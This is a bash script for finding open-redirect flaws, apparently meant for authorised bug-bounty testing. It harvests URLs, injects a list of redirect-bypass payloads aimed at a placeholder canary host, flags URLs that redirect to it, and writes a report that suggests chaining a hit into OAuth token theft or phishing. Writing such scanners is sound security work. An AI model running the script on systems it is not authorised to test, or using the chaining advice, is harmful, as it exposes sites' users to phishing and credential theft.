#!/usr/bin/env bash
# open_redirect.sh — Open redirect candidate finder.
#
# How it works:
#   1) Collect URLs → keep redirect-ish params (url, redirect, next, return, ...)
#   2) Try a battery of bypass payloads pointing to a canary domain
#   3) Inspect Location: header (and meta refresh) for the canary
#   4) Hits = high-confidence open redirects
#
# Required: curl
# Recommended: gau

set -uo pipefail

LEGAL='
================ LEGAL NOTICE ================
This tool sends HTTP requests with redirect payloads. Use only on:
  (a) your own systems,
  (b) authorised targets,
  (c) self-hosted lab apps.
==============================================
'

CANARY="evil.example.org"   # pure marker, no live exploitation
TARGET=""; URLLIST=""; OUT=""; YES=0
while [[ $# -gt 0 ]]; do
  case "$1" in
    -l|--list)    URLLIST="$2"; shift 2 ;;
    -o|--out)     OUT="$2"; shift 2 ;;
    --canary)     CANARY="$2"; shift 2 ;;
    --yes)        YES=1; shift ;;
    -h|--help)    sed -n '2,16p' "$0"; exit 0 ;;
    *)            TARGET="$1"; shift ;;
  esac
done

[[ -z "$TARGET" && -z "$URLLIST" ]] && { echo "Usage: $0 <target-url> | -l urls.txt"; exit 2; }
echo "$LEGAL"
[[ $YES -ne 1 ]] && { read -rp "Proceed? (yes/N) " a; [[ "$a" != yes ]] && exit 1; }

OUT="${OUT:-./openredir_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT"
URLS="$OUT/urls.txt"
TARGETED="$OUT/redir_params.txt"
HITS="$OUT/hits.txt"
REPORT="$OUT/report.md"

have(){ command -v "$1" >/dev/null 2>&1; }

REDIR_PARAMS='url|uri|redirect|redir|next|return|returnto|return_to|returnurl|continue|goto|target|dest|destination|callback|cb|forward|out|view|link|fwd'

# Bypass payloads (most common open-redirect tricks)
read -r -d '' PAYLOADS <<EOF || true
http://${CANARY}
https://${CANARY}
//${CANARY}
//${CANARY}/
/\\\\${CANARY}
/%2f%2f${CANARY}
http:${CANARY}
//google.com@${CANARY}
http://localhost.${CANARY}
${CANARY}
javascript://${CANARY}
EOF

# ---- 1. Collect URLs --------------------------------------------------
if [[ -n "$URLLIST" ]]; then cp "$URLLIST" "$URLS"
elif have gau; then echo "[*] gau on $TARGET ..."; echo "$TARGET" | gau --threads 5 2>/dev/null | sort -u > "$URLS"
else echo "$TARGET" > "$URLS"; fi
NURL=$(wc -l < "$URLS")

# ---- 2. Filter to redirect params -------------------------------------
grep -iE "[?&](${REDIR_PARAMS})=" "$URLS" | sort -u > "$TARGETED"
NPARAM=$(wc -l < "$TARGETED")
echo "    -> $NURL URLs, $NPARAM redirect-ish params"

(( NPARAM == 0 )) && { echo "    !! no redirect params"; exit 0; }

# ---- 3. Probe --------------------------------------------------------
> "$HITS"
echo "[*] Probing ..."
while read -r u; do
  while IFS= read -r p; do
    [[ -z "$p" ]] && continue
    p_enc=$(printf '%s' "$p" | jq -sRr @uri 2>/dev/null || echo "$p")
    mutated=$(echo "$u" | sed -E "s#([?&](${REDIR_PARAMS})=)[^&]*#\1${p_enc}#i")
    # No redirect follow; we want the Location: header itself
    headers=$(curl -sk -I --max-time 8 "$mutated" 2>/dev/null)
    body=$(curl -sk --max-time 8 -L --max-redirs 0 "$mutated" 2>/dev/null | head -c 4000)

    if echo "$headers" | grep -iE "^location:" | grep -qiE "${CANARY}"; then
      echo "LOCATION | $mutated  | payload=$p" >> "$HITS"
      echo "  [HIT-302] $mutated  (payload: $p)"
    elif echo "$body" | grep -qiE "<meta[^>]+refresh[^>]+${CANARY}|window\.location[^=]*=[^;]*${CANARY}"; then
      echo "META_OR_JS | $mutated  | payload=$p" >> "$HITS"
      echo "  [HIT-meta/js] $mutated"
    fi
  done <<< "$PAYLOADS"
done < "$TARGETED"

NHIT=$(wc -l < "$HITS" 2>/dev/null || echo 0)
echo "    -> $NHIT open redirect candidates"

# ---- 4. Report -------------------------------------------------------
{
  echo "# Open Redirect Report"
  echo
  echo "_Generated: $(date -u '+%Y-%m-%dT%H:%M:%SZ')_  Canary: \`$CANARY\`"
  echo
  echo "## Summary"
  echo
  echo "| Metric | Count |"
  echo "|--------|-------|"
  echo "| URLs scanned | $NURL |"
  echo "| Redirect-ish params probed | $NPARAM |"
  echo "| Hits | $NHIT |"
  echo
  echo "## Hits"
  if [[ -s "$HITS" ]]; then
    echo '```'
    cat "$HITS"
    echo '```'
  else
    echo "_(none)_"
  fi
  echo
  echo "## Validation & impact"
  echo
  echo "1. **Verify in a real browser** — some redirects only fire client-side; some are blocked by the browser's same-origin restrictions."
  echo "2. **Open redirect alone is usually Low/Informational**. Chain it for impact:"
  echo "   - OAuth flow with attacker-controlled redirect_uri → token theft"
  echo "   - Phishing landing page on the legit-looking domain"
  echo "   - SSRF chain when redirect target is internal"
  echo "3. Check whether the program excludes open redirect (many do unless chained)."
  echo
  echo "---"
} > "$REPORT"

echo
echo "[+] Done."
echo "    Report: $REPORT"
